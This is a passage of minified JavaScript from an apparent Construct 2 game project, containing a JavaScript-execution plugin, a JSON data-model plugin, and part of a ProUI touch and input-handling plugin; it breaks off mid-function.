this.CNDS.CompareAliasCallReturnValue.call(this,i,s,e,t)},C2CompareExecReturnWithParams:function(t,e,i,s){switch(e){case 2:e=4;break;case 3:e=5;break;case 4:e=2;break;case 5:e=3}return this.CNDS.CompareExecReturnWithParams.call(this,i,s,e,t)},C2CompareValue:function(t,e,i,s){switch(e){case 2:e=4;break;case 3:e=5;break;case 4:e=2;break;case 5:e=3}return this.CNDS.CompareValue.call(this,i,s,e,t)},CompareExecReturnWithParams:function(code_,params_,cmp_,value_){var ret=void 0,caller_name_="'Compare JS code Completion value' condition";params_.length&&(code_=HashtagParamsToCode(code_,params_));try{ret=eval(code_)}catch(err){var info={debug_caller:"CompareExecReturnWithParams",caller_name:caller_name_,error_message:err.message,"show-code":!0,code:code_};return void this.ShowError(info)}return"boolean"==typeof ret&&(ret=ret?1:0),cr.do_cmp(ret,cmp_,value_)},CompareFunctionReturnValue:function(t,e,i,s){var n=void 0;return"boolean"==typeof(n=this.CallJSfunction(t,e,!1,"'Compare Function return value' condition"))&&(n=n?1:0),cr.do_cmp(n,i,s)},CompareStoredReturnValue:function(t,e){var i=this.returnValue;return"boolean"==typeof i&&(i=i?1:0),cr.do_cmp(i,t,e)},AllScriptsLoaded:function(){return this.sciptsToLoad<=0},CompareValue:function(t,e,i,s){var n=void 0;return"boolean"==typeof(n=this.Value("'Compare Value' condition",[].concat(t,e)))&&(n=n?1:0),cr.do_cmp(n,i,s)},CompareAliasValue:function(t,e,i){var s="'Compare alias' condition",n=this.ParseJS(t,!0,"'Set alias' action");if(n.alias_found){if(!n.error){var r=n.context[this.construct_compare_function_prefix+n.endname];if(!r||"object"!=typeof n.context){var o=n.end;return"boolean"==typeof o&&(o=o?1:0),cr.do_cmp(o,e,i)}try{return r.call(n.context,e,i)}catch(t){a={debug_caller:"CompareAliasValue",caller_name:s,"show-alias-expression":!0,alias_expression:n.trimmed_code,error_message:"Error in user defined '"+this.construct_compare_function_prefix+n.endname+"' function: "+t.message};return void this.ShowError(a)}}}else{var a={debug_caller:"CompareAliasValue",caller_name:s,error_message:"No such alias '"+t+"'"};this.ShowError(a)}},CompareAliasCallReturnValue:function(t,e,i,s){var n=void 0;return"boolean"==typeof(n=this.CallAlias(t,e,!1,"'Compare Alias Call return value' condition"))&&(n=n?1:0),cr.do_cmp(n,i,s)}},k;for(k in CndsObject)Cnds.prototype[k]=CndsObject[k];function Acts(){}pluginProto.cnds=new Cnds;var ActsObject={ExecuteJSWithParams:function(code,params_){var caller_name_="'Execute JS code' action";this.returnValue=void 0,code=code.replace(/#[0-9]+/g,function(t){t=params_[t.substr(1)];return"string"==typeof t?"'"+t+"'":t});try{this.returnValue=eval(code)}catch(err){return void this.ShowError({debug_caller:"ExecuteJSWithParams",caller_name:caller_name_,"show-code":!0,code:code,error_message:err.message})}},CallJSfunction:function(t,e,i,s,n){this.CallJSfunction(t,e,i,s,n)},SetValue:function(e,i){var s="'Set value' action",n=this.ParseJS(e,!0,s);if(!n.error)try{n.context[n.endname]=i}catch(t){e=e+"=";"string"==typeof i?e=e+"'"+i+"'":e+=i;e={debug_caller:"SetValue",caller_name:s,"show-alias-expression":n.alias_found,alias_expression:n.trimmed_code,"show-code":!0,code:e,error_message:t.message};return void this.ShowError(e)}},Call:function(t,e,i,s){this.CallJSfunction(t,e,!0,"'Call' action")},InitAlias:function(t,e){var i,s,n="'Init alias' action";t=t.trim(),0!=(e=e.trim()).length?0<=t.indexOf(".")||0<=t.indexOf("[")||0<=t.indexOf("]")?(s={debug_caller:"InitAlias",caller_name:n,error_message:"Alias name must not contain '.', '[' or ']' signs: '"+t+"'"},this.ShowError(s)):null==this.Aliases[t]?((i=new Object).js=e,i.dotstring=e.split("[").join(".["),this.Aliases[t]=i):(s={debug_caller:"InitAlias",caller_name:n,error_message:"Alias '"+t+"' already exists"},this.ShowError(s)):(s={debug_caller:"InitAlias",caller_name:n,error_message:"Javascript string of alias '"+t+"' must not be empty."},this.ShowError(s))},SetAlias:function(e,i){var s="'Set alias' action",n=this.ParseJS(e,!0,"'Set alias' action");if(n.alias_found){if(!n.error)try{n.context[n.endname]=i}catch(t){var r=e+"=";"string"==typeof i?r=r+"'"+i+"'":r+=i;r={debug_caller:"SetAlias",caller_name:s,"show-alias-expression":!0,alias_expression:n.trimmed_code,"show-code":!0,code:r,error_message:t.message};return void this.ShowError(r)}}else{var r={debug_caller:"SetAlias",caller_name:s,error_message:"No such alias '"+n.trimmed_code+"'"};this.ShowError(r)}},CallAlias:function(t,e,i,s){this.CallAlias(t,e,i,s)}},k;for(k in ActsObject)Acts.prototype[k]=ActsObject[k];function Exps(){}pluginProto.acts=new Acts;var ExpsObject={JSCodeValue:function(){var params_=Array.prototype.slice.call(arguments),ret;if(__CONSTRUCT3_RUNTIME3__)ret={set_int:function(){},set_float:function(){},set_string:function(){},set_any:function(){}};else{ret=params_[0];for(var i=0;i<params_.length-1;i++)params_[i]=params_[i+1];params_.pop()}var code_=params_[0],caller_name_="'JSCodeValue' expression",jscode=code_;params_.splice(0,1),params_.length&&(jscode=HashtagParamsToCode(jscode,params_));var jsret=void 0;try{jsret=eval(jscode)}catch(err){return this.ShowError({debug_caller:"JSCodeValue",caller_name:caller_name_,"show-code":!0,code:jscode,error_message:err.message}),void ret.set_any(void 0)}if("boolean"==typeof jsret){if(ret.set_any(jsret?1:0),__CONSTRUCT3_RUNTIME3__)return jsret?1:0}else if(ret.set_any(jsret),__CONSTRUCT3_RUNTIME3__)return jsret},StoredReturnValue:function(){var t,e=Array.prototype.slice.call(arguments);if(__CONSTRUCT3_RUNTIME3__)t={set_int:function(){},set_float:function(){},set_string:function(){},set_any:function(){}};else{t=e[0];for(var i=0;i<e.length-1;i++)e[i]=e[i+1];e.pop()}if("boolean"==typeof this.returnValue){if(t.set_any(this.returnValue?1:0),__CONSTRUCT3_RUNTIME3__)return this.returnValue?1:0}else if(t.set_any(this.returnValue),__CONSTRUCT3_RUNTIME3__)return this.returnValue},FunctionReturnValue:function(){var t,e=Array.prototype.slice.call(arguments);if(__CONSTRUCT3_RUNTIME3__)t={set_int:function(){},set_float:function(){},set_string:function(){},set_any:function(){}};else{t=e[0];for(var i=0;i<e.length-1;i++)e[i]=e[i+1];e.pop()}var s=e[0],n="'FunctionReturnValue' expression",r=this.ParseJS(s,!1,n);if(e.splice(0,1),r.error)t.set_any(void 0);else{var o=void 0;if("boolean"==typeof(o=this.CallJSfunction(s,e,!1,n,r))){if(t.set_any(o?1:0),__CONSTRUCT3_RUNTIME3__)return o?1:0}else if(t.set_any(o),__CONSTRUCT3_RUNTIME3__)return o}},Value:function(){var t,e=Array.prototype.slice.call(arguments);if(__CONSTRUCT3_RUNTIME3__)t={set_int:function(){},set_float:function(){},set_string:function(){},set_any:function(){}};else{t=e[0];for(var i=0;i<e.length-1;i++)e[i]=e[i+1];e.pop()}var s=this.Value("'Value' expression",e);if("boolean"==typeof s){if(t.set_any(s?1:0),__CONSTRUCT3_RUNTIME3__)return s?1:0}else if(t.set_any(s),__CONSTRUCT3_RUNTIME3__)return s},AliasValue:function(){var e,t=Array.prototype.slice.call(arguments);if(__CONSTRUCT3_RUNTIME3__)e={set_int:function(){},set_float:function(){},set_string:function(){},set_any:function(){}};else{e=t[0];for(var i=0;i<t.length-1;i++)t[i]=t[i+1];t.pop()}var s=t[0],n="'AliasValue' expression",r=this.ParseJS(s,!0,n);if(!r.alias_found){var o={debug_caller:"AliasValue",caller_name:n,error_message:"No such alias '"+r.trimmed_code+"'"};return this.ShowError(o),void e.set_any(void 0)}if(r.error)e.set_any(void 0);else{var a=void 0;try{a=r.end}catch(t){o={debug_caller:"AliasValue",caller_name:n,"show-alias-expression":!0,alias_expression:r.trimmed_code,error_message:t.message};return this.ShowError(o),void e.set_any(void 0)}if("boolean"==typeof a){if(e.set_any(a?1:0),__CONSTRUCT3_RUNTIME3__)return a?1:0}else if(e.set_any(a),__CONSTRUCT3_RUNTIME3__)return a}},AliasCallReturnValue:function(){var t,e=Array.prototype.slice.call(arguments);if(__CONSTRUCT3_RUNTIME3__)t={set_int:function(){},set_float:function(){},set_string:function(){},set_any:function(){}};else{t=e[0];for(var i=0;i<e.length-1;i++)e[i]=e[i+1];e.pop()}var s=e[0],n="'AliasCallValue' expression",r=this.ParseJS(s,!0,n);if(e.splice(0,1),!r.alias_found){var o={debug_caller:"AliasCallValue",caller_name:n,error_message:"No such alias '"+r.trimmed_code+"'"};return this.ShowError(o),void t.set_any(void 0)}if(r.error)t.set_any(void 0);else{o=void 0;if("boolean"==typeof(o=this.CallJSfunction(s,e,!1,n,r))){if(t.set_any(o?1:0),__CONSTRUCT3_RUNTIME3__)return o?1:0}else if(t.set_any(o),__CONSTRUCT3_RUNTIME3__)return o}}},k;for(k in ExpsObject)Exps.prototype[k]=ExpsObject[k];pluginProto.exps=new Exps,instanceProto.EXPS=pluginProto.exps,instanceProto.CNDS=pluginProto.cnds,instanceProto.ACTS=pluginProto.acts}(),cr.plugins_.aekiro_model=function(t){this.runtime=t},function(){var t=cr.plugins_.aekiro_model.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime};var e=t.Instance.prototype;function i(t){if(null==t)return-1;if("number"==typeof t||"string"==typeof t)return 0;if(null!=t.length)return t.length;var e,i=0;for(e in t)i+=1;return i}function l(t,e){return t=!0===t?1:!1===t?0:null==t||null==t?null!=e&&null!=e?e:0:"object"==typeof t?JSON.stringify(t):t}e.onCreate=function(){if(this.tag=this.properties[0],this.lang_root=this.properties[1],this.hashtable={},this.currentEntry=this.hashtable,this.exp_CurKey="",this.exp_CurValue=0,this.exp_Loopindex=0,this.uiType="model",this.linkedBehaviors=[],this.linkedBehaviors_lastResetTick=0,this.linkedLabels=[],this.linkedLabels_lastResetTick=0,this.lang_code="",this.hashtable={},this.tag){if(!cr.proui)throw new Error("ProUI Plugin not found. Please add it to the project.");cr.proui.addTag(this.tag,this)}this.proui=cr.proui,this.model_plugin=cr.plugins_.aekiro_model.prototype;var s=this;window.aekiro_model_value_set=function(t,e,i){t=s.proui.tags[t];s.model_plugin.acts.SetValueByKeyString.call(t,e,i)},window.aekiro_model_json_set=function(t,e,i){t=s.proui.tags[t];s.model_plugin.acts.SetJSONByKeyString.call(t,e,i)},window.aekiro_model=function(t,e,i){t=s.proui.tags[t];s.model_plugin.acts[e].apply(t,i)}},e.registerBehavior=function(t){this.runtime.extra.notRegister||(this.runtime.changelayout&&this.linkedBehaviors_lastResetTick!=this.runtime.tickcount&&(this.linkedBehaviors.length=0,this.linkedBehaviors_lastResetTick=this.runtime.tickcount),this.linkedBehaviors.push(t))},e.registerLabel=function(t){this.runtime.extra.notRegister||(this.runtime.changelayout&&this.linkedLabels_lastResetTick!=this.runtime.tickcount&&(this.linkedLabels.length=0,this.linkedLabels_lastResetTick=this.runtime.tickcount),this.linkedLabels.push(t))},e.unregisterBehavior=function(t){this.removeFromArray(this.linkedBehaviors,t)},e.unregisterLabel=function(t){this.removeFromArray(this.linkedLabels,t)},e.removeFromArray=function(t,e){for(var i=0,s=t.length;i<s;i++)if(t[i]==e)return void t.splice(i,1)},e.notifyBehaviorModels=function(t,e){var i=null;e&&(i=e.except);var s=this.linkedBehaviors;if(s.length)for(var n,r,o=0,a=s.length;o<a;o++)s[o]!=i?"root"!=t&&"root"!=s[o].modelKey&&(n=s[o].modelKey,r=t,null==n||null==r||n!=r&&n.slice(0,r.length+1)!=r+"."&&r.slice(0,n.length+1)!=n+".")||s[o].setElementValue(this.getValue(s[o].modelKey),e):console.log("except :"+i.inst.uid)},e.updateLabels=function(){var t=this.linkedLabels;if(t){var e=this.lang_root?this.lang_root+"."+this.lang_code:this.lang_code,i=this.getValue(e);if(i)for(var s=0,n=t.length;s<n;s++)null!=(i=this.getValue(e+"."+t[s].modelKey))&&t[s]._setValue(i)}},e.getLocalisedLabel=function(t){var e=this.lang_root?this.lang_root+"."+this.lang_code:this.lang_code;return this.getValue(e+"."+t)},e.cleanAll=function(){for(var t in this.hashtable)delete this.hashtable[t];this.currentEntry=this.hashtable},e.getEntry=function(t,e){var i,s=e||this.hashtable;if(!t||""===t||"root"==t||0==t.length)return s;"string"==typeof t&&(t=t.split("."));for(var n=0,r=t.length;n<r;n++){if(i=t[n],u(s)){var o=parseInt(i);if(o<0||o>=s.length)throw console.error("MODEL %s: setting item %s while array only have %s !",this.uid,o,s.length),"err"}null!=s[i]&&"object"==typeof s[i]||(s[i]={}),s=s[i]}return s},e.getValue=function(t,e){var i,s=e||this.hashtable;if(!t||""===t||"root"==t||0==t.length)return s;"string"==typeof t&&(t=t.split("."));for(var n=0,r=t.length;n<r;n++){if(i=t[n],!s.hasOwnProperty(i))return;s=s[i]}return s},e.setValue=function(t,e,i){if(""===t||0===t.length)null!==e&&"object"==typeof e&&(null==i?this.hashtable=e:i=e);else{null==i&&(i=this.hashtable),"string"==typeof t&&(t=t.split("."));var s=t.pop();try{var n=this.getEntry(t,i)}catch(t){throw"err"}if(u(n)){var r=parseInt(s);if(r<0||r>=n.length)return void console.error("MODEL %s: setting item %s while array only have %s !",this.uid,r,n.length)}n[s]=e}},e.removeKey=function(t){var e;""===t||0===t.length?this.cleanAll():("string"==typeof t&&(t=t.split(".")),void 0!==this.getValue(t)&&(e=t.pop(),t=this.getEntry(t),u(t)?e<0||e>=t.length||(e===t.length-1?t.pop():0===e?t.shift():t.splice(e,1)):delete t[e]))};var u=function(t){return t instanceof Array};function n(t){for(var e in t)if(t.hasOwnProperty(e))return;return 1}function s(){}function r(){}function o(){}e.saveToJSON=function(){return{d:this.hashtable}},e.loadFromJSON=function(t){this.hashtable=t.d},e.onDestroy=function(){},t.cnds=new s,s.prototype.ForEachItem=function(t){var e=this.getEntry(t),i=this.runtime.getCurrentEventStack(),s=i.current_event,n=i.isModifierAfterCnds();for(t in this.exp_Loopindex=-1,e)n&&this.runtime.pushCopySol(s.solModifiers),this.exp_CurKey=t,this.exp_CurValue=e[t],this.exp_Loopindex++,s.retrigger(),n&&this.runtime.popSol(s.solModifiers);return this.exp_CurKey="",this.exp_CurValue=0,!1},s.prototype.KeyExists=function(t){return""!=t&&void 0!==this.getValue(t)},s.prototype.IsEmpty=function(t){t=this.getEntry(t);return i(t)<=0},t.acts=new r,r.prototype.SetValueByKeyString=function(t,e,i){if(""!=t&&"root"!=t){try{this.setValue(t,e)}catch(t){return}(i=i||{}).op=4,i.key=t,i.value=e,this.notifyBehaviorModels(t,i)}else console.error("MODEL %s: You can't set the root to a simple value !",this.tag)},r.prototype.SetJSONByKeyString=function(e,i){if(null===(t=i)||"function"!=typeof t&&"object"!=typeof t)try{i=JSON.parse(i)}catch(t){return console.error("MODEL %s: SetJSONByKeyString() **** The json you are trying to set is not valid !"),console.error("key = %s",e),console.error("value = %s",i),void console.error("********************* ")}var t;try{this.setValue(e,i)}catch(t){return}this.notifyBehaviorModels(e,{op:2})},r.prototype.AddToValueByKeyString=function(t,e,i){if(""!==t){var s=t.split("."),n=this.getValue(s)||0;try{this.setValue(s,n+e)}catch(t){return}i=i||{},e=this.getValue(t)||0,i.op=4,i.key=t,i.value=e,this.notifyBehaviorModels(t,i)}},r.prototype.PushValue=function(t,e){var i=this.getEntry(t);null!=i&&!n(i)||(this.setValue(t,[]),i=this.getEntry(t)),u(i)?(i.push(e),this.notifyBehaviorModels(t,{op:1})):console.log("not an array")},r.prototype.PushJSON=function(t,e){try{e=JSON.parse(e)}catch(t){return void console.error("MODEL PLugin: The json you are trying to push is not valid !")}r.prototype.PushValue.call(this,t,e)},r.prototype.InsertValue=function(t,e,i){var s=this.getEntry(t);null!=s&&!n(s)||(this.setValue(t,[]),s=this.getEntry(t)),u(s)?s.length<i?console.error("MODEL PLugin: Can't insert item at %s while array only has %s !",i,s.length):(s.splice(i,0,e),this.notifyBehaviorModels(t,{op:3,idx:i})):console.log(this.hashtable)},r.prototype.InsertJSON=function(t,e,i){try{e=JSON.parse(e)}catch(t){return void console.error("MODEL PLugin: The json you are trying to insert is not valid !")}r.prototype.InsertValue.call(this,t,e,i)},r.prototype.RemoveItemByIndex=function(t,e){var i=this.getEntry(t);null!=i&&!n(i)&&u(i)?e<0||e>=i.length||(e===i.length-1?i.pop():0===e?i.shift():i.splice(e,1),this.notifyBehaviorModels(t,{op:-1,idx:e})):console.log("The value at key = "+t+" is empty or not an array")},r.prototype.RemoveByKeyString=function(t){this.removeKey(t),this.notifyBehaviorModels(t)},r.prototype.CleanAll=function(){this.cleanAll(),this.notifyBehaviorModels("root")},r.prototype.StringToHashTable=function(t){if(""!=t){try{this.hashtable=JSON.parse(t)}catch(t){return void console.error("MODEL PLugin: The json you are trying to load is not valid !",t)}this.notifyBehaviorModels("root",{op:2})}else this.cleanAll()},r.prototype.SetLanguage=function(t){this.lang_code=t,this.updateLabels()},t.exps=new o,o.prototype.at=function(t,e,i){e=e.split(".");i=l(this.getValue(e),i);t.set_any(i)},o.prototype.arrayValueByValue=function(t,e,i,s,n,r){var o=this.getValue(e),a=0;if(!u(o))return console.log("not an array"),void t.set_any(a);for(var h=0,c=o.length;h<c;h++)if(this.getValue(i,o[h])==s){a=this.getValue(n,o[h]);break}a=l(a,r),t.set_any(a)},o.prototype.curKey=function(t){t.set_string(this.exp_CurKey)},o.prototype.curValue=function(t,e,i){e=this.getValue(e,this.exp_CurValue),e=l(e,i);t.set_any(e)},o.prototype.loopindex=function(t){t.set_int(this.exp_Loopindex)},o.prototype.asJSON=function(t){var e=JSON.stringify(this.hashtable);t.set_string(e)},o.prototype.makeJSON=function(t){var e={};if(1<arguments.length)for(var i=arguments.length,s=1;s<i;s+=2)e[arguments[s]]=arguments[s+1];t.set_string(JSON.stringify(e))},o.prototype.makeArray=function(t){var e=[];if(1<arguments.length)for(var i=arguments.length,s=1;s<i;s++)e.push(arguments[s]);t.set_string(JSON.stringify(e))},o.prototype.pop=function(t,e,i){e=this.getEntry(e),i=null==e?0:null==i||i===e.length-1?e.pop():e.splice(i,1);t.set_any(l(i))},o.prototype.shift=function(t,e){e=this.getEntry(e),e=null==e?0:e.shift();t.set_any(l(e))},o.prototype.itemCnt=function(t,e){e=i(this.getValue(e));t.set_int(e)}}(),cr.plugins_.aekiro_proui2=function(t){this.runtime=t},function(){var t=cr.plugins_.aekiro_proui2.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime,this.touches=[],this.mouseDown=!1,this.touchDown=!1,this.cursor={x:null,y:null},this._callbackObjs={},this._callbackObjs.touch=[],this._callbackObjs.wheel=[],this.handled=!1};var e=t.Instance.prototype,g={left:0,top:0};e.findTouch=function(t){for(var e=0,i=this.touches.length;e<i;e++)if(this.touches[e].id===t)return e;return-1};var r=[];function c(t,e,i,s){var n=r.length?r.pop():new o;return n.init(t,e,i,s),n}function a(t){r.length<100&&r.push(t)}function o(){this.starttime=0,this.time=0,this.lasttime=0,this.startx=0,this.starty=0,this.x=0,this.y=0,this.lastx=0,this.lasty=0,this.id=0,this.startindex=0,this.triggeredHold=!1,this.tooFarForHold=!1}o.prototype.init=function(t,e,i,s){var n=cr.performance_now();this.time=n,this.lasttime=n,this.starttime=n,this.startx=t,this.starty=e,this.x=t,this.y=e,this.lastx=t,this.lasty=e,this.width=0,this.height=0,this.pressure=0,this.id=i,this.startindex=s,this.triggeredHold=!1,this.tooFarForHold=!1},o.prototype.update=function(t,e,i,s,n,r){this.lasttime=this.time,this.time=t,this.lastx=this.x,this.lasty=this.y,this.x=e,this.y=i,this.width=s,this.height=n,this.pressure=r,!this.tooFarForHold&&15<=cr.distanceTo(this.startx,this.starty,this.x,this.y)&&(this.tooFarForHold=!0)};var s=-1e3,n=-1e3,h=-1e4;function l(t,e){for(var i=0,s=t.behavior_insts.length;i<s;i++)if(t.behavior_insts[i]instanceof e.Instance)return t.behavior_insts[i];return null}function u(t,e){for(var i,s,n,r,o=this.my_instances.valuesRef(),a=0,h=o.length;a<h;a++)(i=o[a])&&i.layer.visible&&i.visible&&(n=i.layer.canvasToLayer(t,e,!0),r=i.layer.canvasToLayer(t,e,!1),i.update_bbox(),(s=l(i,this)).OnAnyTouchStart&&s.OnAnyTouchStart(),i.contains_pt(n,r)&&s.OnTouchStart&&s.OnTouchStart(n,r))}function f(t,e){for(var i,s,n,r,o=this.my_instances.valuesRef(),a=0,h=o.length;a<h;a++)(i=o[a])&&i.layer.visible&&i.visible&&(n=i.layer.canvasToLayer(t,e,!0),r=i.layer.canvasToLayer(t,e,!1),i.update_bbox(),s=l(i,this),i.contains_pt(n,r)&&s.OnTouchMove&&s.OnTouchMove(n,r))}function p(t,e){for(var i,s,n,r=this.my_instances.valuesRef(),o=0,a=r.length;o<a;o++)(i=r[o])&&(s=i.layer.canvasToLayer(t,e,!0),n=i.layer.canvasToLayer(t,e,!1),(i=l(i,this)).OnAnyTouchEnd&&i.OnAnyTouchEnd(s,n))}function d(t){for(var e,i,s=this.my_instances.valuesRef(),n=0,r=s.length;n<r;n++)(e=s[n])&&(i=l(e,this)).OnWheel&&i.OnWheel(t)}function i(){}function m(){}o.prototype.maybeTriggerTap=function(t,e){var i;this.triggeredHold||(i=cr.performance_now())-this.starttime<=333&&!this.tooFarForHold&&cr.distanceTo(this.startx,this.starty,this.x,this.y)<15&&(t.trigger_index=this.startindex,t.trigger_id=this.id,t.getTouchIndex=e,h=i-h<=666&&cr.distanceTo(s,n,this.x,this.y)<25?(t.curTouchX=this.x,t.curTouchY=this.y,n=s=-1e3,-1e4):(t.curTouchX=this.x,t.curTouchY=this.y,s=this.x,n=this.y,i),t.getTouchIndex=0)},e.onCreate=function(){this.isWindows8=!(void 0===window.c2isWindows8||!window.c2isWindows8),this.curTouchX=0,this.curTouchY=0,this.trigger_index=0,this.trigger_id=0,this.getTouchIndex=0,this.useMouseInput=!0;var t=0<this.runtime.fullscreen_mode?document:this.runtime.canvas,e=document;this.runtime.isDirectCanvas?e=t=window.Canvas:this.runtime.isCocoonJs&&(e=t=window);var i=this;"undefined"!=typeof PointerEvent?(t.addEventListener("pointerdown",function(t){i.onPointerStart(t)},!1),t.addEventListener("pointermove",function(t){i.onPointerMove(t)},!1),e.addEventListener("pointerup",function(t){i.onPointerEnd(t,!1)},!1),e.addEventListener("pointercancel",function(t){i.onPointerEnd(t,!0)},!1),this.runtime.canvas&&(this.runtime.canvas.addEventListener("MSGestureHold",function(t){t.preventDefault()},!1),document.addEventListener("MSGestureHold",function(t){t.preventDefault()},!1),this.runtime.canvas.addEventListener("gesturehold",function(t){t.preventDefault()},!1),document.addEventListener("gesturehold",function(t){t.preventDefault()},!1))):window.navigator.msPointerEnabled?(t.addEventListener("MSPointerDown",function(t){i.onPointerStart(t)},!1),t.addEventListener("MSPointerMove",function(t){i.onPointerMove(t)},!1),e.addEventListener("MSPointerUp",function(t){i.onPointerEnd(t,!1)},!1),e.addEventListener("MSPointerCancel",function(t){i.onPointerEnd(t,!0)},!1),this.runtime.canvas&&(this.runtime.canvas.addEventListener("MSGestureHold",function(t){t.preventDefault()},!1),document.addEventListener("MSGestureHold",function(t){t.preventDefault()},!1))):(t.addEventListener("touchstart",function(t){i.onTouchStart(t)},!1),t.addEventListener("touchmove",function(t){i.onTouchMove(t)},!1),e.addEventListener("touchend",function(t){i.onTouchEnd(t,!1)},!1),e.addEventListener("touchcancel",function(t){i.onTouchEnd(t,!0)},!1)),this.useMouseInput&&!this.runtime.isDomFree&&(jQuery(document).mousemove(function(t){i.onMouseMove(t)}),jQuery(document).mousedown(function(t){i.onMouseDown(t)}),jQuery(document).mouseup(function(t){i.onMouseUp(t)})),this.runtime.isDomFree||(e=function(t){i.onWheel(t)},document.addEventListener("mousewheel",e,!1),document.addEventListener("DOMMouseScroll",e,!1)),this.runtime.tick2Me(this),this.enable=!0,this.lastTouchX=null,this.lastTouchY=null,(cr.proui=this).cssURL=this.properties[0],this.fontFamily=this.properties[1],this.defaultSoundTag=this.properties[2],this.useHowler=0===this.properties[3],this.firstFrame=!0;this.runtime;this.toBeDestroyed=[],this.currentDialogs=[],this.currentDialogs_lastResetTick=0,this.tags={},this.tags_lastResetTick=0,this.scrollViews={},this.iter=0,this.notRegister=!1,this.areInputsActive=!0},e.getIter=function(){return this.iter++,this.iter},e.setNoRegister=function(){},e.addTag=function(t,e){this.runtime.extra||(this.runtime.extra={}),!this.runtime.extra.notRegister&&t&&(this.tags.hasOwnProperty(t)?console.error("PROUI: Tag %s already exist !",t):this.tags[t]=e)},e.removeTag=function(t){delete this.tags[t]},e.addDialog=function(t){this.runtime.changelayout&&this.currentDialogs_lastResetTick!=this.runtime.tickcount&&(this.currentDialogs.length=0,this.currentDialogs_lastResetTick=this.runtime.tickcount),this.currentDialogs.push(t)},e.isModalDialogOpened=function(){for(var t=0;t<this.currentDialogs.length;t++)if(this.currentDialogs[t].isModal)return!0;return!1},e.removeDialog=function(t){this.removeFromArray(this.currentDialogs,t)},e.removeFromArray=function(t,e){for(var i=0,s=t.length;i<s;i++)if(t[i]==e)return void t.splice(i,1)},e.clearDestroyList=function(){for(var t=this.toBeDestroyed,e=0,i=t.length;e<i;e++)this.runtime.DestroyInstance(t[e]);t.length=0},e.playAudio=function(t){var e,i;this.useHowler?(this.getDependency(cr.plugins_.skymenhowlerjs,"howler"),this.howler?cr.plugins_.skymenhowlerjs.prototype.acts.PlayByName.call(this.howler,t,this.defaultSoundTag):console.error("ProUI: Please add the Howler plugin to the project.")):(this.getDependency(cr.plugins_.Audio,"audio"),this.audio?(e={val:0,set_float:function(t){e.val=t}},cr.plugins_.Audio.prototype.exps.Volume.call(this.audio,e,this.defaultSoundTag),i=e.val,cr.plugins_.Audio.prototype.acts.PlayByName.call(this.audio,0,t,0,i,this.defaultSoundTag)):console.error("ProUI: Please add the Audio plugin to the project."))},e.getDependency=function(t,e){if(null!=this[e])return this[e];if(t){var i,s,n=this.runtime.types;for(i in n)if((s=n[i].instances[0])instanceof t.prototype.Instance)return this[e]=s,this[e];this[e]||console.error("ProUI: Can not find "+e+" object.")}else console.error("ProUI: Can not find the "+e+" object.")},e.isTypeValid=function(t,e,i){for(var s=0,n=e.length;s<n;s++)if(!!e[s]&&t.type.plugin instanceof e[s])return;throw new Error(i)},e.runCallback=function(t,e){var i;""!=t&&(i=e.split(","),(e=window.c2_callFunction)?e(t,i):console.error("ProUI : Please add the Function plugin to the project."))},e.validateSimpleValue=function(t,e){t=!0===t?1:!1===t?0:null==t||null==t||"object"==typeof t?null!=e&&null!=e?e:0:t;return t},e.HookMe=function(t,e){for(var i,s=0,n=e.length;s<n;s++)i=e[s],this._callbackObjs[i].push(t)},e.UnHookMe=function(t,e){for(var i,s=0,n=e.length;s<n;s++)i=e[s],cr.arrayFindRemove(this._callbackObjs[i],t)},e.onWheel=function(t){var e=t.wheelDelta||(t.detail?-t.detail:0);this.triggerDir=e<0?0:1,this.handled=!1,this.runtime.isInUserInputEvent=!0;for(var i=0,s=this._callbackObjs.wheel.length;i<s;i++)this.handled=!0,d.call(this._callbackObjs.wheel[i],this.triggerDir);this.runtime.isInUserInputEvent=!1,this.handled&&cr.isCanvasInputEvent(t)&&t.preventDefault()},e.onPointerMove=function(t){if(this.enable&&t.pointerType!==t.MSPOINTER_TYPE_MOUSE&&"mouse"!==t.pointerType){t.preventDefault&&t.preventDefault();var e=this.findTouch(t.pointerId),i=cr.performance_now();if(0<=e){var s=this.runtime.isDomFree?g:jQuery(this.runtime.canvas).offset(),e=this.touches[e];if(!(i-e.time<2)){e.update(i,t.pageX-s.left,t.pageY-s.top,t.width||0,t.height||0,t.pressure||0);for(var n=t.pageX-s.left,r=t.pageY-s.top,o=this._callbackObjs.touch.length,a=0;a<o;a++)f.call(this._callbackObjs.touch[a],n,r)}}}},e.onPointerStart=function(t){if(this.enable&&t.pointerType!==t.MSPOINTER_TYPE_MOUSE&&"mouse"!==t.pointerType){t.preventDefault&&cr.isCanvasInputEvent(t)&&t.preventDefault();var e=this.runtime.isDomFree?g:jQuery(this.runtime.canvas).offset(),i=t.pageX-e.left,e=t.pageY-e.top;cr.performance_now();this.trigger_index=this.touches.length,this.trigger_id=t.pointerId,this.touches.push(c(i,e,t.pointerId,this.trigger_index)),this.runtime.isInUserInputEvent=!0,this.curTouchX=i,this.curTouchY=e;for(var s=this._callbackObjs.touch.length,n=0;n<s;n++)u.call(this._callbackObjs.touch[n],this.curTouchX,this.curTouchY);this.runtime.isInUserInputEvent=!1}},e.onPointerEnd=function(t,e){if(this.enable&&t.pointerType!==t.MSPOINTER_TYPE_MOUSE&&"mouse"!==t.pointerType){t.preventDefault&&cr.isCanvasInputEvent(t)&&t.preventDefault();t=this.findTouch(t.pointerId);this.trigger_index=0<=t?this.touches[t].startindex:-1,this.trigger_id=0<=t?this.touches[t].id:-1,this.runtime.isInUserInputEvent=!0,0<=t&&(this.lastTouchX=this.touches[t].x,this.lastTouchY=this.touches[t].y);for(var i=this._callbackObjs.touch.length,s=0;s<i;s++)p.call(this._callbackObjs.touch[s],this.lastTouchX,this.lastTouchY);0<=t&&(e||this.touches[t].maybeTriggerTap(this,t),a(this.touches[t]),this.touches.splice(t,1)),this.runtime.isInUserInputEvent=!1}},e.onTouchMove=function(t){if(this.enable){t.preventDefault&&t.preventDefault();for(var e,i=cr.performance_now(),s=this._callbackObjs.touch.length,n=0,r=t.changedTouches.length;n<r;n++){e=t.changedTouches[n];var o=this.findTouch(e.identifier);if(0<=o){var a,h=this.runtime.isDomFree?g:jQuery(this.runtime.canvas).offset();if(!(i-(a=this.touches[o]).time<2)){var 